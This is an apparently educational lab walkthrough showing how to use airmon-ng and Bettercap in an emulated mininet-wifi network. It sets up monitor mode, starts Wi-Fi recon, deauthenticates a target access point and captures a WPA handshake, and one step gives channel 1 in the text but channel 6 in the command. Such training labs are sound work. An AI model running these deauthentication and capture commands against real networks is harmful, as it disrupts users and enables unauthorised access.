Select "**Bettercap Recon**" from the menu. Allow up to 30 seconds to initialize the network. 

![[Pasted image 20250317233629.png]]

*Note: normally, when using Bettercap with physical network cards, it is necessary to use “airmon-ng check kill” to kill processes that may interfere with Bettercap. However, running this command in the mininet-wifi network is unnecessary and may cause the environment to fail.*

Start the monitor interface for a-wlan0.

```bash
airmon-ng start a-wlan0
```

If the following prompt appears, input "**y**" and hit enter. 

![[Pasted image 20250317234041.png]]

Successful initialization will appear as pictured below.

![[Pasted image 20250317234109.png]]

Verify that the interface has been put into monitor mode using the following command:

```bash
ifconfig | grep flags
```

As pictured below, a-wlan0mon should now be present. 

![[Pasted image 20250317234159.png]]

Launch Bettercap with the following command. 

```
bettercap -iface a-wlan0mon
```

You will be greeted by a prompt of with the name of the network interface. 

![[Pasted image 20250317234243.png]]

Configure the console for a more convenient way to view your attack. 

```bash
set wifi.show.sort clients desc
set ticker.commands 'clear; wifi.show'
ticker on
set wifi.show.sort clients desc
```

After running the commands, you should see the following on your screen. 

![[Pasted image 20250317234426.png]]

Disable console logging using the following command. Note that the monitor interface has not stopped channel hopping. 

```bash
events.stream off
```

Set the handshakes file and enable the `wifi.recon` module

```bash
set wifi.handshakes.file ./loot/4whs
wifi.recon on
```

Next, force the interface to only operate on channel 1

```bash
wifi.recon.channel 6
```

Start the deauthentication attack using the command below: 

```
wifi.deauth 76:df:71:67:40:2b
```

It may take a few seconds, but Bettercap will catch the handshake as shown below. 

![[Pasted image 20250318000519.png]]

Your final packet count may differ from the screenshot below. 

NEXT LAB: [[Lab 02 - Bettercap Wi-Fi Authentication Capture]]


